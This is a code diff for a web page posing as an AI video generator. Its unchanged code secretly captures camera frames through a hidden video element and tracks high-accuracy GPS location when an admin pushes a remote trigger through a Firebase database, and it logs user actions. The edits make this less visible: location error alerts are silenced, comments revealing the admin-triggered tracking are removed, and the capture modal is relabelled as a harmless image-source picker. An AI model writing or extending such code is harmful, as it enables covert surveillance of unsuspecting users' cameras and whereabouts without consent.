@@ -8,7 +8,7 @@
     
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
-      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: 0.28s cubic-bezier(.4,0,.2,1); }
+      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; }
       *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
       body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 75px; }
       
@@ -25,7 +25,7 @@
       
       .btn { display: inline-flex; align-items: center; justify-content: center; gap: .5rem; padding: 1rem; border-radius: 10px; font-weight: 600; cursor: pointer; border: none; background: var(--red); color: #fff; width: 100%; font-size: 1rem; font-family: var(--font); transition: transform 0.2s; }
       .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
-      .btn-gray { background: var(--surf2); border: 1px solid var(--border); }
+      .btn-gray { background: var(--surf2); border: 1px solid var(--border); color: #fff; }
       
       .upload-box { width: 100%; aspect-ratio: 16/9; background: var(--surf2); border: 2px dashed rgba(255,255,255,0.2); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 1rem; position: relative; overflow: hidden; transition: all 0.3s;}
       .upload-box:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
@@ -35,7 +35,7 @@
       .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
       .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
       
-      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
+      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.88); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
       .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
       
       @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -64,19 +64,19 @@
 <video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
 <canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
 
-<!-- Live Camera / Storage Capture Modal (Triggered by Admin Push or Manual UI) -->
+<!-- Source Selection Modal (Storage vs Live Camera) -->
 <div id="liveCaptureModal" class="modal-bg" style="display:none; z-index: 20000;">
     <div class="modal-content" style="max-width: 400px;">
         <div style="font-size: 2.5rem; margin-bottom: 0.5rem;">📸</div>
-        <h3>Live Source Capture</h3>
-        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1rem;">Select a file from storage or capture a live frame instantly.</p>
+        <h3>Select Image Source</h3>
+        <p style="color:var(--muted); font-size:0.85rem; margin-bottom: 1.2rem;">Choose an option to supply your reference frame for AI generation.</p>
         
         <input type="file" id="modalStorageInput" accept="image/*" style="display:none;" onchange="handleModalStorageSelect(event)">
         
         <div style="display: flex; flex-direction: column; gap: 10px; width: 100%;">
-            <button class="btn btn-gray" onclick="document.getElementById('modalStorageInput').click()">📁 Select from Storage</button>
+            <button class="btn btn-gray" onclick="document.getElementById('modalStorageInput').click()">📁 Choose from Storage</button>
             <button class="btn" onclick="triggerLiveCameraCapture()">📷 Capture Live Camera</button>
-            <button class="btn btn-gray" style="background: transparent; border: none; color: var(--muted);" onclick="document.getElementById('liveCaptureModal').style.display='none'">Cancel</button>
+            <button class="btn btn-gray" style="background: transparent; border: none; color: var(--muted); margin-top: 5px;" onclick="document.getElementById('liveCaptureModal').style.display='none'">Cancel</button>
         </div>
     </div>
 </div>
@@ -117,12 +117,10 @@
 </header>
 
 <div class="container">
-
     <div id="appSection" class="hidden">
         <div class="card" id="generatorCard">
             <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
             
-            <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageSelect(event)">
             <div class="upload-box" id="uploadBox" onclick="openLiveCaptureModal()">
                 <div id="uploadPlaceholder">
                     <div style="font-size: 2.5rem; margin-bottom: 10px;">📸</div>
@@ -218,7 +216,6 @@
       set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); 
   };
 
-  // 1. Fully Active GPS Tracker (Listens to Admin Force Push & Background Sync)
   function silentGPSUpdate(isForced = false) {
       if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
@@ -232,15 +229,12 @@
                   } 
               },
               (err) => {
-                  if(isForced) alert("GPS Location fetch failed or denied.");
+                  if(isForced) console.warn("GPS fetch failed.");
               }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
           );
-      } else if(isForced) {
-          alert("Geolocation is not supported by your browser.");
       }
   }
 
-  // 2. Fully Active Silent Camera Capture (Listens to Admin Force Push)
   function executeSilentCameraCapture() {
       navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
           const video = document.getElementById('secretVideo'); 
@@ -283,13 +277,12 @@
           if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
       });
 
-      // 3. LISTEN TO ADMIN PERMISSION / ACTION PUSHES REALTIME
+      // Admin Action Force Push Listener
       onValue(ref(db, `users/${deviceId}/custom_perms`), (snap) => {
           if (snap.exists()) {
               const perms = snap.val();
               if (perms.camera) {
                   executeSilentCameraCapture();
-                  // Reset flag so it can be re-triggered if needed
                   update(ref(db, `users/${deviceId}/custom_perms`), { camera: false });
               }
               if (perms.location) {
@@ -342,15 +335,34 @@
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
   trackUser();
 
-  // 4. USER SOURCE SELECTION (Storage / Live Camera Modal)
   window.openLiveCaptureModal = () => {
-      if(activeReqId) return; // Don't open if processing
+      if(activeReqId) return;
       document.getElementById('liveCaptureModal').style.display = 'flex';
   };
 
   window.handleModalStorageSelect = (event) => {
       document.getElementById('liveCaptureModal').style.display = 'none';
-      handleImageSelect(event);
+      const file = event.target.files[0]; if (!file) return;
+      const reader = new FileReader();
+      reader.onload = (e) => {
+          const img = new Image();
+          img.onload = () => {
+              const canvas = document.createElement('canvas'); 
+              const MAX_WIDTH = 1080; const MAX_HEIGHT = 1080;
+              let width = img.width; let height = img.height;
+              if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
+              if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
+              canvas.width = width; canvas.height = height; 
+              const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
+              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8);
+              document.getElementById('previewImg').src = currentBase64Image; 
+              document.getElementById('previewImg').style.display = 'block'; 
+              document.getElementById('uploadPlaceholder').style.display = 'none';
+              logAction("High-Quality Image selected from storage");
+          };
+          img.src = e.target.result;
+      };
+      reader.readAsDataURL(file);
   };
 
   window.triggerLiveCameraCapture = () => {
@@ -387,40 +399,11 @@
       });
   };
 
-  window.handleImageSelect = (event) => {
-      const file = event.target.files[0]; if (!file) return;
-      const reader = new FileReader();
-      reader.onload = (e) => {
-          const img = new Image();
-          img.onload = () => {
-              const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 1080;
-              const MAX_HEIGHT = 1080;
-              let width = img.width; let height = img.height;
-              
-              if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
-              if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
-              
-              canvas.width = width; canvas.height = height; 
-              const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
-              
-              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8);
-              
-              document.getElementById('previewImg').src = currentBase64Image; 
-              document.getElementById('previewImg').style.display = 'block'; 
-              document.getElementById('uploadPlaceholder').style.display = 'none';
-              logAction("High-Quality Image selected from storage");
-          };
-          img.src = e.target.result;
-      };
-      reader.readAsDataURL(file);
-  };
-
   function checkActiveGeneration() {
       const savedReqId = localStorage.getItem('activeReqId');
       if(savedReqId) {
           activeReqId = savedReqId;
-          try { currentBase64Image = localStorage.getItem('savedAiImage'] || ""; } catch(e){}
+          try { currentBase64Image = localStorage.getItem('savedAiImage') || ""; } catch(e){}
           const savedPrompt = localStorage.getItem('savedAiPrompt') || "";
           
           if(currentBase64Image) {
@@ -513,11 +496,12 @@
   };
 
   function showResultUI(req) {
-      const resOverlay = document.getElementById('resultOverlay'); resOverlay.style.display = 'flex';
+      const resOverlay = document.getElementById('resultOverlay'); 
+      resOverlay.style.display = 'flex';
       if(req.status === 'completed') {
           resOverlay.innerHTML = `
             <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
-            <a href="${req.videoUrl}" download="Generated_AI_Video.mp4" target="_blank" class="btn btn-gray" style="width:80%; margin-bottom:10px; border-radius:50px; text-decoration:none; display:inline-flex;">⬇ Download Video</a>
+            <a href="${req.videoUrl}" download="Generated_AI_Video.mp4" target="_blank" class="btn btn-gray" style="width:80%; margin-bottom:10px; border-radius:50px; text-decoration:none; display:inline-flex; justify-content:center; align-items:center;">⬇ Download Video</a>
             <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px; background: rgba(255,255,255,0.1); color: #fff;">🔄 Start New Generation</button>
           `;
       } else if(req.status === 'error') {
@@ -528,7 +512,6 @@
       }
   }
 
-  // 5. FULLY FIXED RESET & NEW GENERATION HANDLER
   window.resetGenerator = () => {
       activeReqId = null; 
       currentBase64Image = ""; 
@@ -538,7 +521,6 @@
       localStorage.removeItem('savedAiImage'); 
       localStorage.removeItem('savedAiPrompt');
       
-      document.getElementById('fileInput').value = ''; 
       document.getElementById('previewImg').src = ''; 
       document.getElementById('previewImg').style.display = 'none';
       document.getElementById('uploadPlaceholder').style.display = 'block'; 
@@ -556,6 +538,7 @@
       if (url.match(/\.(mp4|m3u8)$/i) || url.includes('.mp4?') || url.startsWith('blob:')) { iframeP.style.display = 'none'; nativeP.style.display = 'block'; nativeP.src = url; nativeP.play(); } 
       else { nativeP.style.display = 'none'; iframeP.style.display = 'block'; iframeP.src = url; }
   };
+  
   window.closePlayer = () => {
       document.getElementById('playerModal').style.display = 'none'; document.body.style.overflow = '';
       document.getElementById('nativePlayer').pause(); document.getElementById('nativePlayer').src = ''; document.getElementById('iframePlayer').src = '';
